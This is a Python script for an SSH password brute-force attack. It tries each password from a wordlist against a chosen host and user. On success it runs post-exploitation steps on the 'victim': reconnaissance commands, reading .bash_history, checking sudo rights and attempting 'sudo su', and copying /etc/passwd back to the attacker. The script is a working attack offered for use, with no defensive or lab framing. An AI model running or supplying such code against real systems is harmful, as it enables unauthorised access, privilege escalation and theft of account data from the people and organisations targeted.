import paramiko
from pwn import ssh
import os
import sys  # Import sys to handle exit
import time  # Import time for adding delays

def execute_commands_on_victim(ssh_connection):
    try:
        print("\n[+] Checking current user...")
        current_user = ssh_connection['whoami']
        print(f"Current User: {current_user.decode()}")

        print("\n[+] Gathering system information...")
        system_info = ssh_connection['uname -a']
        print(f"System Info: {system_info.decode()}")

        print("\n[+] Checking hostname...")
        hostname = ssh_connection['hostname']
        print(f"Hostname: {hostname.decode()}")

        print("\n[+] Listing files in the home directory...")
        home_files = ssh_connection['ls -la ~']
        print(f"Home Directory Files:\n{home_files.decode()}")

        print("\n[+] Attempting to read .bash_history...")
        bash_history = ssh_connection['cat ~/.bash_history']
        print(f".bash_history:\n{bash_history.decode()}")

        print("\n[+] Checking network configuration...")
        network_info = ssh_connection['ifconfig']
        print(f"Network Info:\n{network_info.decode()}")

        print("\n[+] Attempting to gain root access...")
        sudo_check = ssh_connection['sudo -l']
        print(f"Sudo Permissions:\n{sudo_check.decode()}")
        if 'not allowed' not in sudo_check.decode().lower():
            try:
                su_attempt = ssh_connection['sudo su']
                print(f"Attempt to switch to root:\n{su_attempt.decode()}")
            except Exception as e:
                print(f"[!] Failed to escalate privileges: {e}")
        else:
            print("[!] No sudo privileges available.")

        print("\n[+] Attempting to copy sensitive files...")
        ssh_connection.download('/etc/passwd', '/home/youruser/passwd_copy')
        print("[+] /etc/passwd copied to '/home/youruser/passwd_copy'")

    except Exception as e:
        print(f"[!] An error occurred during command execution: {e}")

# Main function to handle the custom brute-force attack
def main():
    print("Starting Custom Brute Force Attack...")
    
    host = input("Enter the target host IP: ")
    username = input("Enter the target username: ")
    password_file_path = input("Enter the path to your password file: ")

    # Check if the password file exists
    if not os.path.isfile(password_file_path):
        print(f"[!] The file '{password_file_path}' does not exist. Exiting.")
        return

    attempts = 0

    # Attempt to connect using each password from the user-provided list
    with open(password_file_path, "r") as password_list:
        for password in password_list:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                print(f"[{attempts}] Attempting Password: {password}")
                response = ssh(host=host, user=username, password=password, timeout=1)
                
                if response.connected:
                    print(f"[+] Connected with Password {password}")
                    execute_commands_on_victim(response)
                    break
            except paramiko.ssh_exception.AuthenticationException:
                print("Authentication failed.")
            except Exception as e:
                print(f"An error occurred: {e}")
            attempts += 1

    print("Custom Brute Force Attack Completed.")
    time.sleep(2)  # Adding delay to observe the output

if __name__ == "__main__":
    main()
